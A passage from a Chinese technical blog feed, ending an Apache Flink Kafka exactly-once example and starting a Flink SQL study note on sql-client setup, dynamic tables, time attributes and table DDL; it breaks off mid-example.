checkpoint间隔 &lt;  事务超时时间  &lt; max的15分钟</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        KafkaSink&lt;String&gt; kafkaSink = KafkaSink.&lt;String&gt;builder()</span><br><span class="line">                <span class="comment">// 指定 kafka 的地址和端口</span></span><br><span class="line">                .setBootstrapServers(<span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>)</span><br><span class="line">                <span class="comment">// 指定序列化器：指定Topic名称、具体的序列化</span></span><br><span class="line">                .setRecordSerializer(</span><br><span class="line">                        KafkaRecordSerializationSchema.&lt;String&gt;builder()</span><br><span class="line">                                .setTopic(<span class="string">"ws"</span>)</span><br><span class="line">                                .setValueSerializationSchema(<span class="keyword">new</span> SimpleStringSchema())</span><br><span class="line">                                .build()</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// TODO 3.1 精准一次,开启 2pc</span></span><br><span class="line">                .setDeliveryGuarantee(DeliveryGuarantee.EXACTLY_ONCE)</span><br><span class="line">                <span class="comment">// TODO 3.2 精准一次，必须设置 事务的前缀</span></span><br><span class="line">                .setTransactionalIdPrefix(<span class="string">"atguigu-"</span>)</span><br><span class="line">                <span class="comment">// TODO 3.3 精准一次，必须设置 事务超时时间: 大于checkpoint间隔，小于 max 15分钟</span></span><br><span class="line">                .setProperty(ProducerConfig.TRANSACTION_TIMEOUT_CONFIG, <span class="number">10</span>*<span class="number">60</span>*<span class="number">1000</span>+<span class="string">""</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        kafkasource.sinkTo(kafkaSink);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后续读取“ws”这个topic的消费者，要设置事务的隔离级别为“读已提交”，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaEOSDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 消费 在前面使用两阶段提交写入的Topic</span></span><br><span class="line">        KafkaSource&lt;String&gt; kafkaSource = KafkaSource.&lt;String&gt;builder()</span><br><span class="line">                .setBootstrapServers(<span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>)</span><br><span class="line">                .setGroupId(<span class="string">"atguigu"</span>)</span><br><span class="line">                .setTopics(<span class="string">"ws"</span>)</span><br><span class="line">                .setValueOnlyDeserializer(<span class="keyword">new</span> SimpleStringSchema())</span><br><span class="line">                .setStartingOffsets(OffsetsInitializer.latest())</span><br><span class="line">                <span class="comment">// TODO 作为 下游的消费者，要设置 事务的隔离级别 = 读已提交</span></span><br><span class="line">                .setProperty(ConsumerConfig.ISOLATION_LEVEL_CONFIG, <span class="string">"read_committed"</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        env</span><br><span class="line">                .fromSource(kafkaSource, WatermarkStrategy.forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>)), <span class="string">"kafkasource"</span>)</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Flink概述与入门&lt;/h1&gt;
&lt;h2 id=&quot;1、Flink概述&quot;&gt;1、Flink概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-Flink是什么&quot;&gt;1.1 Flink是什么&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;官网：https:flink.apache.org&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Flink核心目标，是“&lt;strong&gt;数据流上的有状态计算&lt;/strong&gt;”(Stateful Computati ons over Data Streams)具体说明：Apache Flink是一个框架和分布式处理引擎，用于对&lt;strong&gt;无界&lt;/strong&gt;和&lt;strong&gt;有界&lt;/strong&gt;数据流进行&lt;strong&gt;有状态&lt;/strong&gt;计算。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Flink-SQL学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/59ffd03b.html"/>
    <id>https://blog.shawncoding.top/posts/59ffd03b.html</id>
    <published>2024-05-31T08:21:48.000Z</published>
    <updated>2024-05-31T08:29:46.406Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Flink SQL</h1><p><img src="http://qnypic.shawncoding.top/blog/202404161647741.png" alt></p><p>Table API和SQL是最上层的API，在Flink中这两种API被集成在一起，SQL执行的对象也是Flink中的表（Table），所以我们一般会认为它们是一体的。Flink是批流统一的处理框架，无论是批处理（DataSet API）还是流处理（DataStream API），在上层应用中都可以直接使用Table API或者SQL来实现；这两种API对于一张表执行相同的查询操作，得到的结果是完全一样的。我们主要还是以流处理应用为例进行讲解。</p><p>SQL API 是基于 SQL 标准的 Apache Calcite 框架实现的，可通过纯 SQL 来开发和运行一个Flink 任务</p><a id="more"></a><h2 id="1、sql-client准备">1、sql-client准备</h2><h3 id="1-1-基于yarn-session模式">1.1 基于yarn-session模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动Flink</span></span><br><span class="line">/opt/module/flink/bin/yarn-session.sh -d</span><br><span class="line"><span class="comment"># 启动Flink的sql-client</span></span><br><span class="line">/opt/module/flink/bin/sql-client.sh embedded -s yarn-session</span><br></pre></td></tr></table></figure><h3 id="1-2-常用配置">1.2 常用配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 结果显示模式</span></span><br><span class="line"><span class="comment"># 默认table，还可以设置为tableau、changelog</span></span><br><span class="line">SET sql-client.execution.result-mode=tableau;</span><br><span class="line"><span class="comment"># 执行环境</span></span><br><span class="line">SET execution.runtime-mode=streaming; <span class="comment">#默认streaming，也可以设置batch</span></span><br><span class="line"><span class="comment"># 默认并行度</span></span><br><span class="line">SET parallelism.default=1;</span><br><span class="line"><span class="comment"># 设置状态TTL</span></span><br><span class="line">SET table.exec.state.ttl=1000;</span><br><span class="line"><span class="comment"># 通过sql文件初始化</span></span><br><span class="line">vim conf/sql-client-init.sql</span><br><span class="line">SET sql-client.execution.result-mode=tableau;</span><br><span class="line">CREATE DATABASE mydatabase;</span><br><span class="line"><span class="comment"># 启动时，指定sql文件</span></span><br><span class="line">/opt/module/flink-1.17.0/bin/sql-client.sh embedded -s yarn-session -i conf/sql-client-init.sql</span><br></pre></td></tr></table></figure><h2 id="2、流处理中的表">2、流处理中的表</h2><table><thead><tr><th></th><th><strong>关系型表/SQL</strong></th><th><strong>流处理</strong></th></tr></thead><tbody><tr><td><strong>处理的数据对象</strong></td><td>字段元组的有界集合</td><td>字段元组的无限序列</td></tr><tr><td><strong>查询（Query）对数据的访问</strong></td><td>可以访问到完整的数据输入</td><td>无法访问到所有数据，必须“持续”等待流式输入</td></tr><tr><td><strong>查询终止条件</strong></td><td>生成固定大小的结果集后终止</td><td>永不停止，根据持续收到的数据不断更新查询结果</td></tr></tbody></table><h3 id="2-1-动态表和持续查询">2.1 动态表和持续查询</h3><ul><li><strong>动态表（Dynamic Tables）</strong></li></ul><p>当流中有新数据到来，初始的表中会插入一行；而基于这个表定义的SQL查询，就应该在之前的基础上更新结果。这样得到的表就会不断地动态变化，被称为“动态表”（Dynamic Tables）</p><p>动态表是Flink在Table API和SQL中的核心概念，它为流数据处理提供了表和SQL支持。我们所熟悉的表一般用来做批处理，面向的是固定的数据集，可以认为是“静态表”；而动态表则完全不同，它里面的数据会随时间变化</p><ul><li><strong>持续查询（Continuous Query）</strong></li></ul><p>动态表可以像静态的批处理表一样进行查询操作。由于数据在不断变化，因此基于它定义的SQL查询也不可能执行一次就得到最终结果。这样一来，我们对动态表的查询也就永远不会停止，一直在随着新数据的到来而继续执行。这样的查询就被称作“持续查询”（Continuous Query）。对动态表定义的查询操作，都是持续查询；而持续查询的结果也会是一个动态表。</p><p>由于每次数据到来都会触发查询操作，因此可以认为一次查询面对的数据集，就是当前输入动态表中收到的所有数据。这相当于是对输入动态表做了一个“快照”（snapshot），当作有限数据集进行批处理；流式数据的到来会触发连续不断的快照查询，像动画一样连贯起来，就构成了“持续查询”</p><p>持续查询的步骤如下：</p><ul><li>流（stream）被转换为动态表（dynamic table）；</li><li>对动态表进行持续查询（continuous query），生成新的动态表；</li><li>生成的动态表被转换成流</li></ul><h3 id="2-2-将流转换成动态表">2.2 将流转换成动态表</h3><p>如果把流看作一张表，那么流中每个数据的到来，都应该看作是对表的一次插入（Insert）操作，会在表的末尾添加一行数据。因为流是连续不断的，而且之前的输出结果无法改变、只能在后面追加；所以我们其实是通过一个只有插入操作（insert-only）的更新日志（changelog）流，来构建一个表。</p><p><img src="http://qnypic.shawncoding.top/blog/202404161647742.png" alt></p><h3 id="2-3-用SQL持续查询">2.3 用SQL持续查询</h3><p><strong>更新（Update）查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们在代码中定义了一个SQL查询</span></span><br><span class="line">Table urlCountTable = tableEnv.sqlQuery(<span class="string">"SELECT user, COUNT(url) as cnt FROM EventTable GROUP BY user"</span>);</span><br></pre></td></tr></table></figure><p>当原始动态表不停地插入新的数据时，查询得到的urlCountTable会持续地进行更改。由于count数量可能会叠加增长，因此这里的更改操作可以是简单的插入（Insert），也可以是对之前数据的更新（Update）。这种持续查询被称为更新查询（Update Query），更新查询得到的结果表如果想要转换成DataStream，必须调用toChangelogStream()方法</p><p><strong>追加（Append）查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们执行一个简单的条件查询，结果表中就会像原始表EventTable一样，只有插入（Insert）操作了</span></span><br><span class="line">Table aliceVisitTable = tableEnv.sqlQuery(<span class="string">"SELECT url, user FROM EventTable WHERE user = 'Cary'"</span>);</span><br><span class="line"><span class="comment">// 这样的持续查询，就被称为追加查询（Append Query），它定义的结果表的更新日志（changelog）流中只有INSERT操作。</span></span><br></pre></td></tr></table></figure><p>由于窗口的统计结果是一次性写入结果表的，所以结果表的更新日志流中只会包含插入INSERT操作，而没有更新UPDATE操作。所以这里的持续查询，依然是一个追加（Append）查询。结果表result如果转换成DataStream，可以直接调用toDataStream()方法。</p><h3 id="2-4-将动态表转换为流">2.4 将动态表转换为流</h3><p>与关系型数据库中的表一样，动态表也可以通过插入（Insert）、更新（Update）和删除（Delete）操作，进行持续的更改。将动态表转换为流或将其写入外部系统时，就需要对这些更改操作进行编码，通过发送编码消息的方式告诉外部系统要执行的操作。在Flink中，Table API和SQL支持三种编码方式：</p><ul><li>仅追加（Append-only）流：仅通过插入（Insert）更改来修改的动态表，可以直接转换为“仅追加”流。这个流中发出的数据，其实就是动态表中新增的每一行</li><li>撤回（Retract）流：撤回流是包含两类消息的流，添加（add）消息和撤回（retract）消息。具体的编码规则是：INSERT插入操作编码为add消息；DELETE删除操作编码为retract消息；而UPDATE更新操作则编码为被更改行的retract消息，和更新后行（新行）的add消息。这样，我们可以通过编码后的消息指明所有的增删改操作，一个动态表就可以转换为撤回流了。</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404161647743.png" alt></p><ul><li>更新插入（Upsert）流：更新插入流中只包含两种类型的消息：更新插入（upsert）消息和删除（delete）消息。所谓的“upsert”其实是“update”和“insert”的合成词，所以对于更新插入流来说，INSERT插入操作和UPDATE更新操作，统一被编码为upsert消息；而DELETE删除操作则被编码为delete消息</li></ul><p>在代码里将动态表转换为DataStream时，只支持仅追加（append-only）和撤回（retract）流，我们调用toChangelogStream()得到的其实就是撤回流。而连接到外部系统时，则可以支持不同的编码方法，这取决于外部系统本身的特性</p><h2 id="3、时间属性">3、时间属性</h2><p>基于时间的操作（比如时间窗口），需要定义相关的时间语义和时间数据来源的信息。在Table API和SQL中，会给表单独提供一个逻辑上的时间字段，专门用来在表处理程序中指示时间。</p><p>所以所谓的时间属性（time attributes），其实就是每个表模式结构（schema）的一部分。它可以在创建表的DDL里直接定义为一个字段，也可以在DataStream转换成表时定义。一旦定义了时间属性，它就可以作为一个普通字段引用，并且可以在基于时间的操作中使用。</p><p><strong>时间属性的数据类型必须为TIMESTAMP</strong>，它的行为类似于常规时间戳，可以直接访问并且进行计算。按照时间语义的不同，可以把时间属性的定义分成**事件时间（event time）和处理时间（processing time）**两种情况</p><h3 id="3-1-事件时间">3.1 事件时间</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 事件时间属性可以在创建表DDL中定义，增加一个字段，通过WATERMARK语句来定义事件时间属性</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> EventTable(</span><br><span class="line">  <span class="keyword">user</span> <span class="keyword">STRING</span>,</span><br><span class="line">  <span class="keyword">url</span> <span class="keyword">STRING</span>,</span><br><span class="line">  ts <span class="built_in">TIMESTAMP</span>(<span class="number">3</span>),</span><br><span class="line">  WATERMARK <span class="keyword">FOR</span> ts <span class="keyword">AS</span> ts - <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECOND</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  ...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 这里我们把ts字段定义为事件时间属性，而且基于ts设置了5秒的水位线延迟</span></span><br><span class="line"><span class="comment">## 时间戳类型必须是 TIMESTAMP 或者TIMESTAMP_LTZ 类型。</span></span><br><span class="line"><span class="comment">## 但是时间戳一般都是秒或者是毫秒（BIGINT 类型），这种情况可以通过如下方式转换</span></span><br><span class="line">ts BIGINT,</span><br><span class="line">time_ltz AS TO_TIMESTAMP_LTZ(ts, 3),</span><br></pre></td></tr></table></figure><h3 id="3-2-处理时间">3.2 处理时间</h3><p>在定义处理时间属性时，必须要额外声明一个字段，专门用来保存当前的处理时间。在创建表的DDL（CREATE TABLE语句）中，可以增加一个额外的字段，通过调用系统内置的PROCTIME()函数来指定当前的处理时间属性</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> EventTable(</span><br><span class="line">  <span class="keyword">user</span> <span class="keyword">STRING</span>,</span><br><span class="line">  <span class="keyword">url</span> <span class="keyword">STRING</span>,</span><br><span class="line">  ts <span class="keyword">AS</span> PROCTIME()</span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="4、DDL（Data-Definition-Language）数据定义">4、DDL（Data Definition Language）数据定义</h2><h3 id="4-1-数据库">4.1 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [catalog_name.]db_name</span><br><span class="line">  [<span class="keyword">COMMENT</span> database_comment]</span><br><span class="line">  <span class="keyword">WITH</span> (key1=val1, key2=val2, ...)</span><br><span class="line"><span class="comment"># 举例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> db_flink;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查询数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span><br><span class="line"><span class="comment"># 查询当前数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CURRENT</span> <span class="keyword">DATABASE</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改数据库</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> [catalog_name.]db_name <span class="keyword">SET</span> (key1=val1, key2=val2, ...)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] [catalog_name.]db_name [ (RESTRICT | <span class="keyword">CASCADE</span>) ]</span><br><span class="line"><span class="comment"># RESTRICT：删除非空数据库会触发异常。默认启用</span></span><br><span class="line"><span class="comment"># CASCADE：删除非空数据库也会删除所有相关的表和函数</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> db_flink2;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 切换当前数据库</span></span><br><span class="line"><span class="keyword">USE</span> database_name;</span><br></pre></td></tr></table></figure><h3 id="4-2-表">4.2 表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [catalog_name.][db_name.]table_name</span><br><span class="line">  (</span><br><span class="line">    &#123; &lt;physical_column_definition&gt; | &lt;metadata_column_definition&gt; | &lt;computed_column_definition&gt; &#125;[ , ...n]</span><br><span class="line">    [ &lt;watermark_definition&gt; ]</span><br><span class="line">    [ &lt;table_constraint&gt; ][ , ...n]</span><br><span class="line">  )</span><br><span class="line">  [<span class="keyword">COMMENT</span> table_comment]</span><br><span class="line">  [PARTITIONED <span class="keyword">BY</span> (partition_column_name1, partition_column_name2, ...)]</span><br><span class="line">  <span class="keyword">WITH</span> (key1=val1, key2=val2, ...)</span><br><span class="line">  [ <span class="keyword">LIKE</span> source_table [( &lt;like_options&gt; )] | <span class="keyword">AS</span> select_query ]</span><br></pre></td></tr></table></figure><ul><li><strong>physical_column_definition</strong></li></ul><p>物理列是数据库中所说的常规列。其定义了物理介质中存储的数据中字段的名称、类型和顺序。其他类型的列可以在物理列之间声明，但不会影响最终的物理列的读取</p><ul><li><strong>metadata_column_definition</strong></li></ul><p>元数据列是 SQL 标准的扩展，允许访问数据源本身具有的一些元数据。元数据列由 METADATA 关键字标识。例如，我们可以使用元数据列从Kafka记录中读取和写入时间戳，用于基于时间的操作（这个时间戳不是数据中的某个时间戳字段，而是数据写入 Kafka 时，Kafka 引擎给这条数据打上的时间戳标记）。connector和format文档列出了每个组件可用的元数据字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyTable (</span><br><span class="line">  <span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line">  <span class="string">`name`</span> <span class="keyword">STRING</span>,</span><br><span class="line">  <span class="string">`record_time`</span> TIMESTAMP_LTZ(<span class="number">3</span>) METADATA <span class="keyword">FROM</span> <span class="string">'timestamp'</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'kafka'</span></span><br><span class="line">  ...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 如果自定义的列名称和 Connector 中定义 metadata 字段的名称一样， FROM xxx 子句可省略</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyTable (</span><br><span class="line"><span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line"><span class="string">`name`</span> <span class="keyword">STRING</span>,</span><br><span class="line"><span class="string">`timestamp`</span> TIMESTAMP_LTZ(<span class="number">3</span>) METADATA</span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'kafka'</span></span><br><span class="line">...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 如果自定义列的数据类型和 Connector 中定义的 metadata 字段的数据类型不一致，程序运行时会自动 cast强转，但是这要求两种数据类型是可以强转的</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyTable (</span><br><span class="line"><span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line"><span class="string">`name`</span> <span class="keyword">STRING</span>,</span><br><span class="line"><span class="comment">-- 将时间戳强转为 BIGINT</span></span><br><span class="line"><span class="string">`timestamp`</span> <span class="built_in">BIGINT</span> METADATA</span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'kafka'</span></span><br><span class="line">...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 默认情况下，Flink SQL planner 认为 metadata 列可以读取和写入。</span></span><br><span class="line"><span class="comment">## 然而，在许多情况下，外部系统提供的只读元数据字段比可写字段多。因此，可以使用VIRTUAL关键字排除元数据列的持久化(表示只读)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyTable (</span><br><span class="line">  <span class="string">`timestamp`</span> <span class="built_in">BIGINT</span> METADATA, </span><br><span class="line">  <span class="string">`offset`</span> <span class="built_in">BIGINT</span> METADATA <span class="keyword">VIRTUAL</span>,</span><br><span class="line">  <span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line">  <span class="string">`name`</span> <span class="keyword">STRING</span>,</span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'kafka'</span></span><br><span class="line">  ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong>computed_column_definition</strong></li></ul><p>计算列是使用语法column_name AS computed_column_expression生成的虚拟列。计算列就是拿已有的一些列经过一些自定义的运算生成的新列，在物理上并不存储在表中，只能读不能写。列的数据类型从给定的表达式自动派生，无需手动声明。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyTable (</span><br><span class="line">  <span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line">  <span class="string">`price`</span> <span class="keyword">DOUBLE</span>,</span><br><span class="line">  <span class="string">`quantity`</span> <span class="keyword">DOUBLE</span>,</span><br><span class="line">  <span class="string">`cost`</span> <span class="keyword">AS</span> price * quanitity</span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'kafka'</span></span><br><span class="line">  ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong>定义Watermark</strong></li></ul><p>Flink SQL 提供了几种 WATERMARK 生产策略：</p><p>(1) <strong>严格升序</strong>：WATERMARK FOR rowtime_column AS rowtime_column。Flink 任务认为时间戳只会越来越大，也不存在相等的情况，只要相等或者小于之前的，就认为是迟到的数据。</p><p>(2) <strong>递增</strong>：WATERMARK FOR rowtime_column AS rowtime_column - INTERVAL ‘0.001’ SECOND 。一般基本不用这种方式。如果设置此类，则允许有相同的时间戳出现。</p><p>(3) <strong>有界无序</strong>： WATERMARK FOR rowtime_column AS rowtime_column – INTERVAL ‘string’ timeUnit 。此类策略就可以用于设置最大乱序时间，假如设置为 WATERMARK FOR rowtime_column AS rowtime_column - INTERVAL ‘5’ SECOND ，则生成的是运行 5s 延迟的Watermark。一般都用这种 Watermark 生成策略，此类 Watermark 生成策略通常用于有数据乱序的场景中，而对应到实际的场景中，数据都是会存在乱序的，所以基本都使用此类策略。</p><ul><li><strong>PRIMARY KEY</strong></li></ul><p>主键约束表明表中的一列或一组列是唯一的，并且它们不包含NULL值。主键唯一地标识表中的一行，只支持 not enforced</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyTable (</span><br><span class="line"><span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line"><span class="string">`name`</span> <span class="keyword">STRING</span>,</span><br><span class="line">PARYMARY <span class="keyword">KEY</span>(user_id) <span class="keyword">not</span> <span class="keyword">enforced</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'kafka'</span></span><br><span class="line">...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong>PARTITIONED BY</strong></li></ul><p>创建分区表</p><ul><li><strong>with语句</strong></li></ul><p>用于创建表的表属性，用于指定外部存储系统的元数据信息。配置属性时，表达式key1=val1的键和值都应该是字符串字面值。如下是Kafka的映射表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> KafkaTable (</span><br><span class="line"><span class="string">`user_id`</span> <span class="built_in">BIGINT</span>,</span><br><span class="line"><span class="string">`name`</span> <span class="keyword">STRING</span>,</span><br><span class="line"><span class="string">`ts`</span> <span class="built_in">TIMESTAMP</span>(<span class="number">3</span>) METADATA <span class="keyword">FROM</span> <span class="string">'timestamp'</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line"><span class="string">'connector'</span> = <span class="string">'kafka'</span>,</span><br><span class="line"><span class="string">'topic'</span> = <span class="string">'user_behavior'</span>,</span><br><span class="line"><span class="string">'properties.bootstrap.servers'</span> = <span class="string">'localhost:9092'</span>,</span><br><span class="line"><span class="string">'properties.group.id'</span> = <span class="string">'testGroup'</span>,</span><br><span class="line"><span class="string">'scan.startup.mode'</span> = <span class="string">'earliest-offset'</span>,</span><br><span class="line"><span class="string">'format'</span> = 